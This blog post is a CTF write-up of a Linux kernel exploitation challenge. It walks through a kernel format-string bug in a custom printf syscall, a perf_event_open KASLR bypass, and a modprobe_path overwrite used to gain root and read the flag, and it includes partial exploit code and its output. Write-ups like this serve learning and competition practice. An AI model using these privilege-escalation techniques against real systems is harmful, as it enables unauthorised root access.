---
layout: post
title: "GrabCON CTF 2021 - Paas [Pwn]"
categories: ctf
tags: kernel linux format-string 00xc
date: 2021-09-05 16:23:00 +0200
author: 00xc
---

Paas was a kernel exploitation challenge during GrabCON CTF 2021 that only got a single solve (our own). We are given a tarball and SSH access to a remote server. The compressed archive contains a shell script (`run.sh`) to launch a virtual machine using `qemu-system-x86_64`, a `bzImage` (the VM's kernel), an `initramfs` directory (the VM's filesystem), and a file named `printf.c`.

The `printf.c` file contains the source of a Linux kernel module which registers a new system call with the number 548. This syscall accepts a single parameter, which is an array of strings; these will be used as parameters to what seems to be a regular `printf` function. We wrote the following program to test it:

```c
#include <unistd.h>

int main() {
	char* args[] = {
		"s1 -> %s\n",
		"s2",
	}

	syscall(548, args);
}
```

We copy it to the user's home in the `initramfs` and we pack the new filesystem as instructed by the challenge author:

```bash
cd initramfs
find . | cpio -o -H newc > ../initramfs.cpio
cd ..
gzip < initramfs.cpio > initramfs.cpio.gz
rm -f initramfs.cpio
```

We start the VM, cd into the home directory and launch the program, which prints to standard out the expected string:

```
~ $ ./poc
s1 -> s2
```

Inspecting the source for the kernel module, there does not seem to be any input checking, which makes this a format string challenge, with the particularity of it being in kernel space. We then can use `%s` for arbitrary reads, and `%n` for arbitrary writes.

Before we read or write anything we must compute the kernel's base address, as it is randomized due to KASLR. We used the `perf_event_open` technique (implemented [here](https://github.com/bcoles/kasld/blob/master/src/perf_event_open.c)) to do so.

Once we have the kernel's base address, we can read or write any kernel structure by first computing its offset from the base address. Specifically, we are going to use a technique based in overwriting `modprobe_path`, as detailed [here](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/).

In order to get the address of `modprobe_path` we need to debug the Linux kernel with symbols. To get symbols we use [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) to extract the ELF file from the `bzImage` file. Next, we need to enable remote debugging and disable KASLR in order for the symbols to match their intended addresses; we do so by adding the `-s -S` flags and changing the `kaslr` option to `nokaslr` in the qemu command:

```bash
qemu-system-x86_64 \
	-s -S \
	-m 256M -initrd initramfs.cpio.gz -kernel ./bzImage \
	-nographic -monitor /dev/null -append "kpti=1 +smep +smap nokaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet" 2>/dev/null
```

The `-s` flag opens port 1234 for remote debugging, while `-S` will instruct the VM to freeze on startup so we can attach our debugger. We use the following gdb script to connect to the VM:

```
# Get symbols
file client/kernel.elf
# Connect
target remote :1234
# Breakpoint on vulnerable syscall
# We obtain its name by forcing a kernel crash and observing the stack trace
# We can also grep /proc/kallsyms for `printf` inside the VM
b __do_sys_printf
```

We now modify our program to include the KASLR bypass technique mentioned above and again call the vulnerable syscall. Then, we launch qemu and gdb, type `continue` in gdb after hitting the VM freeze, and start our program:

```
~ $ ./exploit 
[.] trying perf_event_open sampling ...
lowest leaked address: ffffffff8105612a
kernel base (likely): ffffffff81000000
```

The program now hits our breakpoint, which gives control back to gdb; at this point, we can obtain the address of `modprobe_path`:

```
(gdb) info address modprobe_path 
Symbol "modprobe_path" is at 0xffffffff8264ec60 in a file compiled without debugging.
```

Therefore, the offset of `modprobe_path` is `0xffffffff8264ec60 - ffffffff81000000 = 0x164ec60`. We can test this by running the following program and enabling KASLR:

```c

/*
 * KASLR leak stuff...
 */

/*
 * Read a location as a string
 */
void arb_read(uintptr_t ptr) {
	char* args[3] = {};

	args[0] = "%p -> %s\n";
	args[1] = ptr;
	args[2] = ptr;
	syscall(548, args);
}

int main() {
	unsigned long addr = get_kernel_addr_perf();
	unsigned long kernel_base, modprobe_path;

	if (!addr)
		return 1;

	kernel_base = addr & 0xfffffffffff00000ul;
	modprobe_path = kernel_base + 0x164ec60;

	printf("modprobe_path: ");
	arb_read(modprobe_path);

	return 0;
}
```

```
~ $ ./exploit 
[.] trying perf_event_open sampling ...
lowest leaked address: ffffffffaac5612a
kernel base (possible): ffffffffaac00000
kernel base (possible): ffffffffaa000000
0xffffffffac24ec60 -> /sbin/modprobe
```

At this point all we need to do is to overwrite `modprobe_path` and follow the steps detailed in kernel exploitation link above. As previously mentioned, we use `%n` for arbitrary writes, as with any other format string attack. The `%n` token writes to a certain location the amount of bytes written by `printf` up to that point. For example, if we were to write the byte `50` to some address, we would use the following format string: `%50c%hn`; `%50c` writes 50 characters to standard out, and `%hn` writes the number of previously written bytes (50) to the location pointed by the next parameter. The `h` modifier writes the specified amount as a short int (2 bytes); since we are writing single-byte amounts, this conveniently null-terminates our string without needing to make an additionall call. All of these behaviors are documented in the [printf documentation](https://www.cplusplus.com/reference/cstdio/printf/).

Finally, these are the steps of our exploit:

1. Leak the kernel base address.
2. Create a script in `/home/user/x` which will copy the flag to our home and make it readable.
3. Create a dummy binary file in `/home/user/dummy` with four `0xff` bytes.
4. Overwrite `modprobe_path`.
5. Try to execute the dummy binary file.
6. Read the flag.

You can find the full exploit [here](https://gist.github.com/00xc/97ce9c2e4413695c3a5423589f1f8767).

```
~ $ ./exploit 
[.] trying perf_event_open sampling ...
lowest leaked address: ffffffffb0c93132
kernel base (possible): ffffffffb0c00000
kernel base (possible): ffffffffb0000000
0xffffffffb224ec60 -> /sbin/modprobe
0xffffffffb224ec60 -> /home/user/x
/home/user/dummy: line 1: ����: not found
GrabCON{pr1n7f_1n_k3rn3l-4_b4d_1d34?}
```